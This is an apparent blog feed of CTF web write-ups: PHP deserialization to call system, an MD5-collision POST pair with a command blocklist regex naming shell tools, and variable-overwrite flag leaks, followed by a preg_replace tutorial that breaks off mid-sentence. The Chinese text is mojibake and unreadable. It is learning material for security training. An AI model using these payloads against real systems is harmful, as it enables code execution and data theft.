        <content type="html"><![CDATA[<p>æ‹¦æˆªæŠ“åŒ…</p><p><img src="/2021/06/24/wang-ding-bei-2020-phpweb/image-20210625161138837.png" alt="image-20210625161138837"></p><p>å‘çŽ°å¯ä»¥ä¼ å‚ï¼š</p><pre class=" language-php"><code class="language-php">func<span class="token operator">=</span>file_get_contents<span class="token operator">&amp;</span>p<span class="token operator">=</span>index<span class="token punctuation">.</span>php</code></pre><p><img src="/2021/06/24/wang-ding-bei-2020-phpweb/image-20210625161300980.png" alt="image-20210625161300980"></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">,</span><span class="token string">"passthru"</span><span class="token punctuation">,</span><span class="token string">"proc_open"</span><span class="token punctuation">,</span><span class="token string">"show_source"</span><span class="token punctuation">,</span><span class="token string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string">"popen"</span><span class="token punctuation">,</span><span class="token string">"dl"</span><span class="token punctuation">,</span><span class="token string">"eval"</span><span class="token punctuation">,</span><span class="token string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string">"touch"</span><span class="token punctuation">,</span><span class="token string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string">"array_map"</span><span class="token punctuation">,</span><span class="token string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string">"uasort"</span><span class="token punctuation">,</span> <span class="token string">"uksort"</span><span class="token punctuation">,</span> <span class="token string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string">"fopen"</span><span class="token punctuation">,</span><span class="token string">"fwrite"</span><span class="token punctuation">,</span><span class="token string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">"date"</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token delimiter">?></span></code></pre><pre><code>&lt;?phpclass Test {    var $p = "ls";    var $func = "system";    function __destruct() {        if ($this-&gt;func != "") {            echo gettime($this-&gt;func, $this-&gt;p);        }    }}$a=new Test();echo serialize($a);?&gt;</code></pre><p><img src="/2021/06/24/wang-ding-bei-2020-phpweb/2.png" alt="2"></p><p><img src="/2021/06/24/wang-ding-bei-2020-phpweb/1.png" alt="1"></p><p><img src="/2021/06/24/wang-ding-bei-2020-phpweb/image-20210625162346172.png" alt="image-20210625162346172"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ´µæ¯:2019-EasyWeb</title>
      <link href="2021/06/23/an-xun-bei-2019-easyweb/"/>
      <url>2021/06/23/an-xun-bei-2019-easyweb/</url>
      
        <content type="html"><![CDATA[<pre><code>http://fb65bb1a-49d3-4476-acca-dcf2d1c5eff9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code></pre><p><code>TXpVek5UTTFNbVUzTURabE5qYz</code>base64è§£ç ä¸¤æ¬¡</p><p><img src="/2021/06/23/an-xun-bei-2019-easyweb/image-20210622104523837.png" alt="image-20210622104523837"></p><p>3535352e706e663</p><p>åå…­è¿›åˆ¶è½¬æ¢555.png</p><p><a href="www.metools.info/learn/l120.html">è½¬ç ç½‘ç«™</a></p><p>åŠ å¯†åæŽ¨index.php</p><pre class=" language-bash"><code class="language-bash">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></pre><p><img src="/2021/06/23/an-xun-bei-2019-easyweb/image-20210622105314503.png" alt="image-20210622105314503"></p><pre class=" language-php+HTML"><code class="language-php+HTML"><?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd']))     header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);if (preg_match("/flag/i", $file)) {    echo '<img src ="./ctf3.jpeg">';    die("xixiÃ¯Â½Âž no flag");} else {    $txt = base64_encode(file_get_contents($file));    echo "<img src='data:image/gif;base64," . $txt . "'></img>";    echo "<br>";}echo $cmd;echo "<br>";if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {    echo("forbid ~");    echo "<br>";} else {    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {        echo `$cmd`;    } else {        echo ("md5 is funny ~");    }}?><html><style>  body{   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;}</style><body></body></html></code></pre><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> `<span class="token variable">$cmd</span>`<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span></code></pre><p><strong>md5å¼ºç±»åž‹çš„ç»•è¿‡</strong></p><p>POSTï¼š</p><pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p><img src="/2021/06/23/an-xun-bei-2019-easyweb/image-20210625154057205.png" alt="image-20210625154057205"></p><p><img src="/2021/06/23/an-xun-bei-2019-easyweb/image-20210625154228954.png" alt="image-20210625154228954"></p><p><img src="/2021/06/23/an-xun-bei-2019-easyweb/image-20210625154301450.png" alt="image-20210625154301450"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF:2020-MarkLovesCat</title>
      <link href="2021/06/22/bjdctf-2020-marklovescat/"/>
      <url>2021/06/22/bjdctf-2020-marklovescat/</url>
      
        <content type="html"><![CDATA[<pre><code>git_extract.py http://1634afca-44d6-449e-a0d4-f617d25e10be.node3.buuoj.cn/.git/</code></pre><p><img src="/2021/06/22/bjdctf-2020-marklovescat/image-20210622095427710.png" alt="image-20210622095427710"></p><p><img src="/2021/06/22/bjdctf-2020-marklovescat/image-20210622095443939.png" alt="image-20210622095443939"></p><h5 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h5><pre><code>&lt;?php$flag = file_get_contents('/flag');</code></pre><h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><pre><code>&lt;?phpinclude 'flag.php';$yds = "dog";$is = "cat";$handsome = 'yds';foreach($_POST as $x =&gt; $y){    $$x = $y;}foreach($_GET as $x =&gt; $y){    $$x = $$y;}foreach($_GET as $x =&gt; $y){    if($_GET['flag'] === $x &amp;&amp; $x !== 'flag'){        exit($handsome);    }}if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){    exit($yds);}if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){    exit($is);}echo "the flag is: ".$flag;</code></pre><pre><code>yds=flag</code></pre><pre><code>is=flag&amp;flag=flag</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP:preg_replace()å‡½æ•°åº”ç”¨</title>
      <link href="2021/06/21/php-preg-replace-han-shu-ying-yong/"/>
      <url>2021/06/21/php-preg-replace-han-shu-ying-yong/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/crxis/p/7714636.html">https://www.cnblogs.com/crxis/p/7714636.html</a></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"as2223adfsf0s4df0sdfsdf"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/0/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//åŽ»æŽ‰0å­—ç¬¦ï¼Œæ­¤æ—¶ç›¸å½“äºŽ replaceçš„åŠŸèƒ½, preg_replace("/0/","A",$str); è¿™æ ·å°±æ˜¯å°†0å˜æˆAçš„æ„æ€äº†</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[0-9]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//åŽ»æŽ‰æ‰€æœ‰æ•°å­—</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[a-z]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//è¿™æ ·æ˜¯åŽ»æŽ‰æ‰€æœ‰å°å†™å­—æ¯</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[A-Z]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//è¿™æ ·æ˜¯åŽ»æŽ‰æ‰€æœ‰å¤§å†™å­—æ¯</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[a-z,A-Z]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//è¿™æ ·æ˜¯åŽ»æŽ‰æ‰€æœ‰å­—æ¯</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"as2223adfsAAf0s4df0sä¸­å›½äººdDä¸­å—æµ·DDfsdf"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[a-z,A-Z,0-9]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//åŽ»æŽ‰æ‰€æœ‰å­—æ¯å’Œæ•°å­—</span><span class="token delimiter">?></span>ç»è¿‡ä»¥ä¸Šçš„ä¾‹å­ï¼Œç›¸ä¿¡å¤§å®¶çŸ¥é“ï¼Œ<span class="token punctuation">[</span> <span class="token punctuation">]</span> å’Œé‡Œé¢çš„<span class="token punctuation">,</span>æœ‰ä»€ä¹ˆä½œç”¨äº†ã€‚ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼ŒåŒ¹é…çš„å­—ç¬¦ä¸²å¿…é¡»åŠ  <span class="token operator">/</span> <span class="token operator">/</span>ï¼ˆçœ‹ä¾‹å­çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼‰<span class="token delimiter">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"acsdcs&lt;55555555>sc&lt;6666>sdcd"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;.*>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¿™ä¸ªæ˜¯è¡¨ç¤ºåŽ»é™¤ä»¥&lt;å¼€å¤´ï¼Œä»¥>ç»“å°¾çš„é‚£éƒ¨ä»½ï¼Œè¾“å‡ºç»“æžœæ˜¯ï¼šacsdcssdcd</span>æ³¨æ„ï¼šä¸Šé¢çš„ <span class="token punctuation">.</span><span class="token operator">*</span> æ˜¯è¡¨ç¤ºä»»ä½•å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ç®¡<span class="token operator">&lt;</span><span class="token operator">></span>åŒ…ä½çš„æ˜¯ä»€ä¹ˆéƒ½åŽ»æŽ‰å…¶ä¸­<span class="token punctuation">.</span> è¡¨ç¤ºä»»æ„å­—ç¬¦ï¼Œ <span class="token operator">*</span> è¡¨ç¤ºä»»æ„ä¸ªæ•°çŽ°åœ¨æˆ‘ä»¬æ¥æ”¹åŠ¨ä¸€ä¸‹ï¼Œå¦‚æžœä¸æƒ³æ˜¯ä»»ä½•ä¸ªæ•°å‘¢ï¼Ÿ<span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"acsdcs&lt;55555555>sc&lt;6666>sdcd"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;.{4}>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//æ­¤æ—¶è¾“å‡ºï¼šacsdcs&lt;55555555>scsdcdå› ä¸º{4}æŒ‡å®šäº†æ¡ä»¶ï¼š&lt;>å†…ä¸º4ä¸ªå­—ç¬¦çš„æ‰æ»¡è¶³æ¡ä»¶ï¼Œæ‰€ä»¥&lt;55555555>ä¸ç¬¦åˆæ¡ä»¶ï¼Œæ²¡æœ‰è¢«æ›¿æ¢ã€‚</span>æ³¨æ„ï¼šè¿™æ—¶æˆ‘ä»¬åˆå­¦åˆ°äº†ä¸€ä¸ªçŸ¥è¯†ç‚¹<span class="token punctuation">{</span>æ•°å­—<span class="token punctuation">}</span> è¡¨ç¤ºæŒ‡å®šå‰é¢çš„ä¸ªæ•°ï¼Œ<span class="token operator">*</span>å°±è¡¨ç¤ºæ˜¯ä»»æ„ä¸ª<span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">--</span>æ— é™ä¸ª<span class="token punctuation">)</span>è¡¨ç¤ºé‡å¤æ¬¡æ•°çš„é™¤äº† <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>æŒ‡å®šæ¬¡æ•°<span class="token punctuation">}</span> è¡¨ç¤ºï¼Œè¿˜æœ‰å¾ˆå¤šè¡¨è¾¾å½¢å¼ï¼š<span class="token delimiter">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"acsdcs&lt;55555555>sc&lt;6666>sd&lt;>cd"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;[0-9]*>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¾“å‡ºacsdcscd</span><span class="token keyword">echo</span> <span class="token string">"&lt;hr>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;[0-9]+>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¾“å…¥acsdcsscsd&lt;>cd</span><span class="token delimiter">?></span>ä¸Šé¢çš„ä¾‹å­åªè¦æ˜¯ä¸ºäº† è¡¨è¾¾ <span class="token operator">*</span> ä¸Ž<span class="token operator">+</span>çš„åŒºåˆ« <span class="token punctuation">,</span><span class="token operator">*</span> è¡¨ç¤ºé‡å¤<span class="token number">0</span>æ•°æˆ–n æ¬¡ï¼Œè€Œ<span class="token operator">+</span> è¡¨ç¤º<span class="token number">1</span>æ¬¡ä»¥ä¸Šï¼Œå³ä¸€ä¾‹ä¸­<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>[0-9]+</span> <span class="token punctuation">></span></span></span>è¡¨ç¤º<span class="token operator">&lt;</span><span class="token operator">></span>é‡Œé¢è‡³å°‘è¦æœ‰ä¸€ä¸ªæ•°å­—æ‰ç¬¦åˆæ¡ä»¶ã€‚ç›¸ä¿¡è¿™æ—¶å¤§å®¶çŸ¥é“ï¼Œä¸ºä»€ä¹ˆä¸Šä¾‹ä¸­ç”¨<span class="token operator">*</span> å’Œç”¨<span class="token operator">+</span>è¾“å‡ºçš„ç»“æžœä¸åŒäº†å§å†æ¥ï¼š<span class="token delimiter">&lt;?php</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"acsdcs&lt;55555555>sc&lt;6666>sd&lt;>cd"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;[0-9]?>/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¾“å‡ºacsdcs&lt;55555555>sc&lt;6666>sdcd</span><span class="token delimiter">?></span>çœ‹<span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">?</span> è¿™é‡Œçš„<span class="token operator">?</span>è¡¨ç¤ºè¦æ˜¯<span class="token number">0</span>æ¬¡æˆ–<span class="token number">1</span> æ¬¡ï¼Œè¶…è¿‡<span class="token number">1</span>æ¬¡åˆä¸ç¬¦åˆæ¡ä»¶äº†ã€‚æ€»ç»“ä¸€ä¸‹ï¼Œä¸Šé¢æˆ‘ä»¬å­¦ä¼šäº† <span class="token operator">*</span> <span class="token operator">+</span> <span class="token operator">?</span> å’Œå¤§æ‹¬å·<span class="token punctuation">{</span><span class="token punctuation">}</span>è¡¨ç¤ºé‡å¤æ¬¡æ•°çš„æ–¹æ³•ã€‚<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>    <span class="token variable">$s</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/ï¼ˆ.*?[æœˆç¥¨|æ±‚|æ›´].*?ï¼‰/i"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span>'<span class="token operator">/</span>href<span class="token operator">=</span>\<span class="token string">"([0-9]+)\.shtm"</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token markup">&lt;\/a></span><span class="token operator">/</span>i'<span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">,</span><span class="token variable">$arr_dstorycate</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr_dstorycate</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>   <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/&lt;img.*?src=[\\\'| \\\"](.*?(?:[\.gif|\.jpg]))[\\\'|\\\"].*?[\/]?>/i"</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$arr_dstorycate</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr_dstorycate</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p> è¡¥å……ï¼š</p><p>.$patternæ˜¯æ•°ç»„,$replaceä¹Ÿæ˜¯æ•°ç»„,åˆ™ä¸­å¯¹åº”çš„ å…ƒç´ è¿›è¡Œæ›¿æ¢</p><p>php</p><p>preg_replaceæœ‰äº”ä¸ªå‚æ•°,æœ‰ä¸‰ä¸ªæ˜¯å¿…é¡»å‚æ•°</p><p>Preg_replace(mixed $pattern, mixed $replacement, mixed $subject [,int $limit = -1 [,int $count ]]); </p><p>$pattern å¯ä»¥æ˜¯å­—ç¬¦ä¸²,å­—ç¬¦ä¸²æ•°ç»„,æˆ–è€…preg</p><p>$replace æ˜¯ç”¨äºŽæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„</p><p>$subject ç›®æ ‡å­—ç¬¦ä¸²æˆ–è€…ç›®æ ‡å­—ç¬¦ä¸²æ•°ç»„</p><p>$limit æ¯ä¸ªæ¨¡å¼åœ¨æ¯ä¸ª$subjectä¸Šæœ€å¤§çš„æ›¿æ¢æ¬¡æ•°,é»˜è®¤æ˜¯-1(æ— é™æ¬¡)</p><p>$count 